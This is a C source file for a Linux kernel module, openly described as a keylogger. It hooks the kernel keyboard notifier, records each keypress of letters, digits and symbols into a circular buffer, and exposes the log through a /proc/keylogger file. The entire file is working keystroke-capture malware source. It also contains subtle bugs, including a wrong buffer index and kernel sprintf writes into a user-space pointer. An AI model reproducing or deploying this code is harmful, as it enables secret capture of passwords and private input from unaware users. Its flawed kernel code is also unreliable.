#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/string.h>
#include <linux/seq_file.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>

#define LOGGER_LENGTH 151

MODULE_LICENSE("GPL");
MODULE_AUTHOR("CB&JW");
MODULE_DESCRIPTION("Keylogger");

static char log[LOGGER_LENGTH];
static size_t keycount = 0;

void addToLog(char key);

//circular buffer simulator

int tracker(struct notifier_block *nblock, unsigned long code, void *_param) {
    struct keyboard_notifier_param *param = _param;
    
    int retval = NOTIFY_OK;
    char key = '0';
    
    //null params are no bueno
    if(param == 0) { return NOTIFY_BAD; }

    //if the input was a keycode, only record pressing down
    if(code == KBD_KEYCODE && param->down) {
        switch(param->value) {

            /*


             THERE IS LEGITIMATELY NO OTHER WAY TO DO THIS.

            */

            case 2: // 1
                key = '1';
                addToLog(key);
                break;
            case 3: // 2
                key = '2';
                addToLog(key);
                break;
            case 4: // 3
                key = '3';
                addToLog(key);
                break;
            case 5: // 4
                key = '4';
                addToLog(key);
                break;
            case 6: // 5
                key = '5';
                addToLog(key);
                break;
            case 7: // 6
                key = '6';
                addToLog(key);
                break;
            case 8: // 7
                key = '7';
                addToLog(key);
                break;
            case 9: // 8
                key = '8';
                addToLog(key);
                break;
            case 10: // 9
                key = '9';
                addToLog(key);
                break;
            case 11: // 0
                key = '0';
                addToLog(key);
                break;
            case 12: // -
                key = '-';
                addToLog(key);
                break;
            case 13: // =   
                key = '=';
                addToLog(key);
                break;
            case 16: // Q
                key = 'Q';
                addToLog(key);
                break;
            case 17: // W
                key = 'W';
                addToLog(key);
                break;
            case 18: // E
                key = 'E';
                addToLog(key);
                break;
            case 19: // R
                key = 'R';
                addToLog(key);
                break;
            case 20: // T
                key = 'T';
                addToLog(key);
                break;
            case 21: // Y
                key = 'Y';
                addToLog(key);
                break;
            case 22: // U
                key = 'U';
                addToLog(key);
                break;
            case 23: // I
                key = 'I';
                addToLog(key);
                break;
            case 24: // O
                key = 'O';
                addToLog(key);
                break;
            case 25: // P
                key = 'P';
                addToLog(key);
                break;
            case 26: // [
                key = '[';
                addToLog(key);  
                break;  
            case 27: // ]
                key = ']';
                addToLog(key);
                break;
            case 30: // A
                key = 'A';
                addToLog(key);
                break;
            case 31: // S
                key = 'S';
                addToLog(key);
                break;
            case 32: // D
                key = 'D';
                addToLog(key);
                break;
            case 33: // F
                key = 'F';
                addToLog(key);
                break;
            case 34: // G
                key = 'G';
                addToLog(key);
                break;
            case 35: // H
                key = 'H';
                addToLog(key);
                break;
            case 36: // J
                key = 'J';
                addToLog(key);
                break;
            case 37: // K
                key = 'K';
                addToLog(key);
                break;
            case 38: // L
                key = 'L';
                addToLog(key);
                break;
            case 39: // ;
                key = ';';
                addToLog(key);
                break;
            case 40: // '
                key = '\'';
                addToLog(key);
                break;
            case 43: // '\'
                key = '\\';
                addToLog(key);
                break;
            case 44: // Z
                key = 'Z';
                addToLog(key);
                break;
            case 45: // X
                key = 'X';
                addToLog(key);
                break;
            case 46: // C
                key = 'C';
                addToLog(key);
                break;
            case 47: // V
                key = 'V';
                addToLog(key);
                break;
            case 48: // B
                key = 'B';
                addToLog(key);
                break;
            case 49: // N
                key = 'N';
                addToLog(key);
                break;
            case 50: // M
                key = 'M';
                addToLog(key);
                break;
            case 51: // ,
                key = ',';
                addToLog(key);
                break;
            case 52: // .
                key = '.';
                addToLog(key);
                break;
            case 53: // / 
                key = '/';
                addToLog(key);
                break;
            case 55: // *
                key = '*';
                addToLog(key);
                break;
            default:
                break;
        }
    }


    return retval;
}

static struct notifier_block nb = {
    .notifier_call = tracker
};


void addToLog(char key) {
    log[++keycount % LOGGER_LENGTH-1] = key;
}

//struct to hold info regarding /proc file
static struct proc_dir_entry *procFile;

static int keylogger_open(struct inode *inode, struct file *file) {
	printk(KERN_ERR " \"keylogger_read\" is open!\n");
	return 0;
}

static int keylogger_release(struct inode *inodep, struct file *filep) {
	return 0;
}

static ssize_t keylogger_read(struct file *file, char __user *buffer, size_t count, loff_t *pos) {
	int i;
	int length = 0;

	if(*pos != 0) { return 0; }	

    length += sprintf(buffer+length, "[");
	for(i = 0; i < LOGGER_LENGTH; i++) {

        length += sprintf(buffer+length,"%c ", log[i]);
        
    }
    length += sprintf(buffer+length, "]\n");

	*pos = length;

	return length;
}


static const struct file_operations keylogger_fops = {
	.owner  = THIS_MODULE,
	.open	= keylogger_open,
	.read	= keylogger_read,
	.llseek = seq_lseek,
	.release = keylogger_release,
};


static int __init keylogger_init(void) {
    procFile = proc_create("keylogger", 0, NULL, &keylogger_fops);

	if (!procFile) {
		return -ENOMEM;
	}

    memset(log, 0, LOGGER_LENGTH);
    keycount = 0;

    register_keyboard_notifier(&nb);

	return 0;
}

static void __exit keylogger_exit(void) {
   
    unregister_keyboard_notifier(&nb);
    

	remove_proc_entry("keylogger", NULL);
}

module_init(keylogger_init);
module_exit(keylogger_exit);
